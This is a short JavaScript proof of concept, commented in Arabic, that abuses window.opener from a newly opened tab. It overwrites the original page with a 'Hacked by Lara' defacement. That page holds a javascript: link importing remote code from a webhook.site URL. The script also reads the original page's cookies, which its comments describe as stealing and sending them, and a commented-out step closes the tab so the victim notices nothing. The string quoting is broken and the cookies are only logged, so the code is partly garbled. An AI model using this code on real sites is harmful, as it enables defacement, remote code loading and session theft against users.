// 1. طباعة علامة لارا في كونسول الصفحة الجديدة
console.log("Lara: Acting from the new tab...");

if (window.opener) {
    // 2. تغيير محتوى الصفحة الأصلية (الضحية لا تزال هناك!)
    window.opener.document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:100px;'><a href="javascript:import('https://webhook.site/12c0f2c0-0a4e-4d98-ba7d-ca0fba6e8f1f')">test</a>Hacked by Lara</h1>";
    
    // 3. سرقة الكوكيز من الصفحة الأصلية وإرسالها
    const cookies = window.opener.document.cookie;
    console.log("Lara: Cookies from original page:", cookies);
    
    // 4. إغلاق النافذة الجديدة فوراً لكي لا يشعر المستخدم بشيء
    // window.close(); 
}
